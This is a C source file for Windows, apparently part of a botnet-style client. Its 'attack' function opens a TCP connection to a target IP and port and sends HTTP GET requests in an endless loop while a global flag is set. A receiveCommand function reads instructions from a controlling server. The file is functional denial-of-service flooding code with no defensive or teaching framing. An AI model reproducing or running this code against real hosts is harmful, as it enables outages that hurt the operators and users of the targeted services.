#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winuser.h>
#include "utils.h"


DWORD WINAPI attack(LPVOID addr){
    struct address target = *(struct address*)addr;
    const char* target_ip = target.ip;
    int port = target.port;
    SOCKET target_socket;
    struct sockaddr_in target_addr;
    WSADATA wsaData;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    startWinsock(&wsaData);
    target_socket = startSocket();
    connectSocket(&target_addr, target_socket, target_ip);
    char msg[64];
    int sprintf_stat = snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
    // printf("%i", sprintf_stat);
    while(1){
        if (running){
            sendMsg(target_socket, msg);
        } else {
            break;
        }
    }
    closeSocket(target_socket);
    return 0;
}

// function to initialize Winsock so that we can use sockets
void startWinsock(WSADATA *wsaData) {
    if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
        printf("WSAStartup failed\n");
        exit(EXIT_FAILURE);
    }
}

// function to start the socket and handles errors
SOCKET startSocket() {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("\n Socket creation error \n");
        WSACleanup();
        exit(EXIT_FAILURE);
    } else {
        printf("Socket created. \n");
    }
    return sock;
}

// function to connect this client to the server via socket
void connectSocket(struct sockaddr_in *addr, SOCKET socket, const char* ip) {

    if (inet_pton(AF_INET, ip, &addr->sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        closesocket(socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else if (connect(socket, (struct sockaddr *)addr, sizeof(*addr)) < 0) {
        printf("\nConnection Failed. \n");
        printf("%i", socket);
        closesocket(socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else{
        printf("Connection successful.\n");
    }
}

// function to send message via socket connection
void sendMsg(SOCKET socket, const char *msg) {
    int sent = send(socket, msg, strlen(msg), 0);
    if (sent == -1){
        printf("Error sending message. The connection must have been cut.\n");
    } else{
        printf("%s sent, status = %i \n", msg, sent);
    }
}

// function to close the socket and clean up the resources that are no longer being used
void closeSocket(SOCKET socket) {
    int stat1 = closesocket(socket);
    int stat2 = WSACleanup();
    if (stat1 == 0 && stat2 == 0 ){
        printf("Connection closed. \n");
    }
}

void receiveCommand(SOCKET server_socket, char *cmd){
    int received = recv(server_socket, cmd, 1024, 0);
    if (received < 1){
        printf("Error receiving message.\n");
    }
}